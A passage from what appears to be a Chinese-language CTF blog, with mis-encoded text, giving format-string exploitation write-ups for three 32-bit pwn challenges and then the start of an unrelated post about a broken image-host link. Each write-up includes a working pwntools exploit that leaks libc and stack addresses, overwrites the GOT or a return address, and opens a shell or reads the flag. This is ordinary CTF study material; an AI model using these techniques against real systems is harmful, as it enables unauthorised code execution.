alt></p><p>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€</li></ul><p>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚<br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªæ¡†æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠç¬¬äºŒä¸ªæ¡†æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªæ¡†æ¡†çš„æ ˆæŒ‡é’ˆï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e6c = 0xffbe5d54gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e64 = 0xffbe5d60</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªè¿‡ç¨‹åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€ï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d60  = 0x0804a016gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d54  = 0x0804a014</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥å†™systemçš„å†…å­˜åœ°å€ä¸Šgotäº†ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0120</span>| <span class="hljs-number">0xffbe5d88</span> --&gt; <span class="hljs-number">0xffbe5e6c</span> --&gt; <span class="hljs-number">0xffbe5d54</span> --&gt; <span class="hljs-number">0x804a014</span> --&gt; <span class="hljs-number">0xf7e0cda0</span> (&lt;__libc_system&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>)</code></pre></div><p>è¿™æ ·å†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch =<span class="hljs-string">'i386'</span><span class="hljs-keyword">import</span> timeelf = ELF(<span class="hljs-string">'./echo3'</span>)debug = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">if</span> debug :        io = process(<span class="hljs-string">'./echo3'</span>)        libc = elf.libc    <span class="hljs-keyword">else</span>:        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25057</span>)        libc = ELF(<span class="hljs-string">'./libc-2.23.so.i386'</span>)    payload = <span class="hljs-string">'%43$pA%30$pA%47$p'</span>    io.sendline(payload)    address = io.recvline().strip()    <span class="hljs-keyword">if</span> address[<span class="hljs-number">-3</span>:] == <span class="hljs-string">'637'</span>:        <span class="hljs-keyword">if</span> address[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] == <span class="hljs-string">'637'</span>:            libc_base = int(address[<span class="hljs-number">2</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">247</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]            tag1_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x118</span>            tag2_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x104</span> - <span class="hljs-number">0x8</span>            system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]            print(<span class="hljs-string">'system_addr  -&gt;'</span> + hex(system_addr))            print(<span class="hljs-string">'tag1_stack_point -&gt;'</span> + hex(tag1_stack_point))            print(<span class="hljs-string">'tag2_stack_point -&gt;'</span> + hex(tag2_stack_point))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span> :        io.close()        <span class="hljs-keyword">continue</span><span class="hljs-comment"># io = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtshort</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtbyte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> resultprintf_got = <span class="hljs-number">0x0804a014</span>key1 = int(hex(tag1_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key2 = int(hex(tag2_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)info(<span class="hljs-string">'--------change the two points to tag_stack_point:-------'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>prev = <span class="hljs-number">0</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">30</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">31</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'1111'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'1111'</span>)info(<span class="hljs-string">'--------change got_table to printf_got:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key3 = <span class="hljs-number">0x14</span>key4 = <span class="hljs-number">0x16</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key3 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">87</span>+i)     prev = (key3 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key4 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">85</span>+i)     prev = (key4 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>payload = payload + <span class="hljs-string">'2222'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'2222'</span>)info(<span class="hljs-string">'--------change printf_got to system_addr:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key5 = int(hex(system_addr)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key6 = int(hex(system_addr)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)print(<span class="hljs-string">'key5 -&gt; '</span> + hex(key5))print(<span class="hljs-string">'key6 -&gt; '</span> + hex(key6))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key5 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">17</span>+i)     prev = (key5 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key6 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">20</span>+i)     prev = (key6 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'3333'</span>io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.recvuntil(<span class="hljs-string">'3333'</span>)raw_input(<span class="hljs-string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>)io.interactive()</code></pre></div><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚<h3 id="ç»“è®ºå’Œæ”¶è·"><a href="#ç»“è®ºå’Œæ”¶è·" class="headerlink" title="ç»“è®ºå’Œæ”¶è·"></a>ç»“è®ºå’Œæ”¶è·</h3></li></ul><p>è¿™ä¸ªé¢˜æ•™ä¼šæˆ‘ä¸€å®šè¦<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼šæœ‰éšæœºæ ˆæƒ…å†µçš„é¢˜ç›®ï¼Œå°½é‡è¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„ibcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,è¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="ä¿æŠ¤å’Œarch-7"><a href="#ä¿æŠ¤å’Œarch-7" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined">CANARY    : <span class="hljs-type">disabled</span>FORTIFY   : <span class="hljs-type">disabled</span>NX        : <span class="hljs-type">ENABLED</span>PIE       : <span class="hljs-type">disabled</span>RELRO     : <span class="hljs-type">Partial</span></code></pre></div><h3 id="idaåˆ†æ-9"><a href="#idaåˆ†æ-9" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">sub_80485C4</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span>&#123;  <span class="hljs-keyword">char</span> *v1; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"..."</span>);  v1 = strtok(s, <span class="hljs-string">"|"</span>);  <span class="hljs-built_in">printf</span>(v1);  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    result = strtok(<span class="hljs-number">0</span>, <span class="hljs-string">"|"</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(result);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>è¿™é‡Œå› ä¸ºç”¨strtokåšå¤„ç†ï¼Œåªæœ‰ä¸€æ¬¡çš„ä¼ é€æœºä¼šï¼Œpayloadéœ€è¦ç”¨<code>|</code>    åˆ†å‰²æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®Œæˆæ¯æ¬¡çš„printfçš„æ¼æ´åˆ©ç”¨ï¼Œç¨å¾®éº»çƒ¦äº†ä¸€ä¸‹ã€‚<br>å¹¶ä¸”å­˜åœ¨åé—¨å‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">080485AB</span>                 <span class="hljs-built_in">push</span>    ebp.text:<span class="hljs-number">080485AC</span>                 mov     ebp, esp.text:<span class="hljs-number">080485AE</span>                 sub     esp, <span class="hljs-number">8</span>.text:<span class="hljs-number">080485B1</span> ; <span class="hljs-number">3</span>:   <span class="hljs-built_in">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"/bin/sh"</span>);.text:<span class="hljs-number">080485B1</span>                 sub     esp, <span class="hljs-number">0Ch</span>.text:<span class="hljs-number">080485B4</span>                 <span class="hljs-built_in">push</span>    offset command  ; <span class="hljs-string">"/bin/sh"</span>.text:<span class="hljs-number">080485B9</span>                 call    _system.text:<span class="hljs-number">080485BE</span>                 add     esp, 10h.text:<span class="hljs-number">080485C1</span>                 nop.text:<span class="hljs-number">080485C2</span>                 leave.text:<span class="hljs-number">080485C3</span>                 retn</code></pre></div><p>è¿™ä¸‹å¯ä»¥ç›´æ¥æ”¹ret addresså³å¯ã€‚</p><h3 id="gdbåˆ†æ-3"><a href="#gdbåˆ†æ-3" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å…ˆè§‚å¯Ÿä¸€ä¸‹ebpé“¾æ˜¯å¦å­˜åœ¨ ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>æ˜¯å­˜åœ¨çš„ï¼Œç„¶åç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ”¹ebp2é‡Œé¢çš„å€¼ï¼š 0xffffd338 æ—¶ï¼Œå‘ç°ä¸‹é¢çš„ç¬¬äºŒä¸ªåªéœ€è¦æ”¹ä¸€ä¸ªå­—èŠ‚å³å¯ï¼Œç„¶åç›®æ ‡å°±æ˜¯æ”¹æˆè¿™ä¸ªæ ˆåœ°å€äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>ç„¶åæ¥ç€åˆ©ç”¨æ¼æ´ï¼Œæ”¹ä¸€ä¸‹è¿”å›åœ°å€åˆ°åé—¨å‡½æ•°å³å¯ã€‚</p><p>ï¼ˆè¿™ä¸ªé¢˜è‡ªå·±åœ¨åšçš„æ—¶å€™ï¼Œå…ˆæ˜¯è¯•ç€åˆ©ç”¨ç¬¬äºŒä¸ªçš„0xffffd2f8 ï¼Œè¿™ä¸ªé“¾å‘ç°æœ¬åœ°å¯ä»¥æ‰“é€šï¼Œè¿œç¨‹æ˜¯ä¸è¡Œçš„ï¼Œè¿™å°±æ˜¯ç¯å¢ƒå› ç´ äº†ï¼Œè¿œç¨‹ç”±äºlibcç‰ˆæœ¬çš„ä¸åŒï¼Œæ ˆç»“æ„ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥åšé¢˜è¿˜æ˜¯ä¼˜å…ˆï¼Œè€ƒè™‘ebpé“¾ï¼Œç„¶åæ²¡æ³•åˆ©ç”¨äº†ï¼Œåœ¨è€ƒè™‘å……åˆ†åˆ©ç”¨æ ˆæ•°æ®ï¼Œè¿™ä¸ªé€šå¸¸ä¹Ÿæ˜¯å‡ºé¢˜äººç²¾å¿ƒè®¾è®¡çš„æ ˆç»“æ„ï¼Œè®©ä½ æœ‰æ•°æ®å¯ä»¥åˆ©ç”¨ã€‚ï¼‰</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>system_addr = <span class="hljs-number">0x080485B4</span>tag1 = <span class="hljs-number">0x4c</span>tag2 = <span class="hljs-number">0x85ab</span>io = process(<span class="hljs-string">'./xman_2019_format'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',27012)</span>payload = <span class="hljs-string">'%&#123;&#125;c%10$hhn|'</span>.format(<span class="hljs-number">0x4c</span>)payload += <span class="hljs-string">'%&#123;&#125;c%18$hn~'</span>.format(<span class="hljs-number">0x85ab</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-keyword">try</span>:io.recvuntil(<span class="hljs-string">'...\n...\n'</span>)io.sendline(payload)sleep(<span class="hljs-number">0.1</span>)io.recvuntil(<span class="hljs-string">'~'</span>)io.sendline(<span class="hljs-string">'ls'</span>)io.recvline()io.recvline()io.interactive()<span class="hljs-keyword">break</span><span class="hljs-keyword">except</span> EOFError :io.close()io = process(<span class="hljs-string">'./xman_2019_format'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',27012)</span></code></pre></div><p>éœ€è¦çˆ†ç ´æ ˆã€‚</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-8"><a href="#ä¿æŠ¤å’Œarch-8" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•got hijackäº†</p><h3 id="idaåˆ†æ-10"><a href="#idaåˆ†æ-10" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdbåˆ†æ-4"><a href="#gdbåˆ†æ-4" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>ç¨‹åºå…ˆè¯»å…¥äº†flagæ–‡ä»¶ï¼Œè‡ªå·±å¯ä»¥å†™ä¸€ä¸ªflagæ–‡ä»¶æµ‹è¯•ï¼Œå¹¶ä¸”gdbè·Ÿéšï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>å…¶ä¼šè¢«è¯»åˆ°å †ä¸Šã€‚ç´§æ¥ç€è·Ÿåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹è¿™ä¸ªå †åœ°å€æ˜¯å¦è¢«ç¨‹åºæ“ä½œä¿®æ”¹äº†ï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ x/s <span class="hljs-number">0x8050b70</span><span class="hljs-number">0x8050b70</span>:"flag&#123;f9255a80-e<span class="hljs-number">059-4c12</span>-<span class="hljs-number">8788</span>-<span class="hljs-number">161</span>bf8c6908b&#125;"</code></pre></div><p>å‘ç°å¹¶æ²¡æœ‰ï¼Œé‚£å°±å¾ˆç®€å•äº†ã€‚æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œåœ¨æ ˆä¸Šæ„é€ å‡ºè¿™ä¸ªå­˜æ”¾flagçš„å †åœ°å€ï¼ˆè®¡ç®—æ–¹å¼å°±æ˜¯åœ¨æ­¤æ—¶çš„æ ˆä¸Šæ‰¾ä¸€ä¸ªåœ°å€æ¥è®¡ç®—åç§»è·å–ï¼‰ã€‚<br>ç¬¬ä¸€æ­¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>å…ˆä¿®æ”¹ebp2ä¸Šå­˜æ”¾çš„å€¼ï¼Œæ”¹æˆåé¢é‚£ä¸ªæ¡†æ¡†å¯¹åº”çš„æ ˆåœ°å€ï¼Œç„¶ååœ¨åšå¤„ç†ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0024</span>| <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd318</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd338</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd348</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x8050ba0</span> --&gt;</span> <span class="hljs-number">0</span>x0</code></pre></div><p>æ­¤æ—¶å†ä¿®æ”¹ebp1ä¸Šçš„å€¼ï¼Œæ”¹æˆåˆšåˆšçš„å †åœ°å€ ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>è¿™æ ·expå†™çš„æ—¶å€™ï¼Œæ‰¾å¥½åç§»%sä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = remote('node3.buuoj.cn',27816)</span>io = process(<span class="hljs-string">'./1'</span>)io.recvuntil(<span class="hljs-string">'Magic echo Server'</span>)io.recvuntil(<span class="hljs-string">'=====================\n'</span>)io.sendline(<span class="hljs-string">'%18$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)flag = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(hex(flag))key = int((hex(flag))[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>) - <span class="hljs-number">32</span> <span class="hljs-number">-12</span> <span class="hljs-number">-4</span>print(<span class="hljs-string">'key'</span>+ hex(key))<span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(<span class="hljs-string">'%6$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)stack_point = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">16</span>tag1 = int((hex(stack_point))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)print(hex(tag1))payload  = <span class="hljs-string">'%'</span> + str(tag1) + <span class="hljs-string">'c%6$hhn'</span> + <span class="hljs-string">'1'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'%'</span> +  str(key &amp; <span class="hljs-number">0xffff</span>) + <span class="hljs-string">'c%14$hn'</span> + <span class="hljs-string">'2'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'2'</span>)io.sendline(<span class="hljs-string">'%18$s'</span>)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</title>
    <link href="/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <url>/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"><a href="#ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ" class="headerlink" title="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"></a>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è‡ªå·±çš„ä»¥å‰ç”³è¯·è¿‡ä¸€ä¸ªä¸ƒåƒäº‘åšè‡ªå·±çš„å›¾åºŠï¼Œä»Šæ™šå†™åšå®¢å‘ç°ï¼Œè‡ªå·±ä¸Šä¼ ä¸ä¸Šå›¾ç‰‡ï¼Œå¹¶ä¸”ç”¨upicå¯¼å‡ºæ¥çš„é“¾æ¥æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚æŸ¥äº†å¾ˆä¹…çš„åŸå› ï¼Œå‘ç°æ˜¯ä¸ƒåƒç‰›åŸæ¥ç»™æˆ‘åˆ†é…çš„å…è´¹å¤–é“¾åŸŸåç»™æˆ‘æ–­ç”¨äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>å°±æ˜¯è¿™ä¸ªæ²¡äº†ï¼Œè‡ªå·±æ’é”™ï¼Œæ’äº†åŠå¤©æ‰å‘ç°ã€‚æ˜¯åœ¨è¿™é‡Œæ‰¾åˆ°çš„ï¼Œå¥½éšè”½ã€‚ã€‚ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±åœ¨æ–‡ä»¶ç®¡ç†é‚£é‡Œå‘ç°ï¼Œç½‘ç«™æç¤ºè¯´å¦‚æœæ— æ³•æ˜¾ç¤ºå›¾ç‰‡ï¼ŒåŠ è½½æ…¢ï¼Œå¯ä»¥åŠ ä¸€ä¸ªåŸŸåã€‚ç„¶åæˆ‘å°±å°è¯•åŠ äº†ä¸€ä¸ªï¼Œç„¶åå°±ä¿®å¤å¥½äº†ã€‚</p><h2 id="ä¿®å¤è¿‡ç¨‹"><a href="#ä¿®å¤è¿‡ç¨‹" class="headerlink" title="ä¿®å¤è¿‡ç¨‹"></a>ä¿®å¤è¿‡ç¨‹</h2><h3 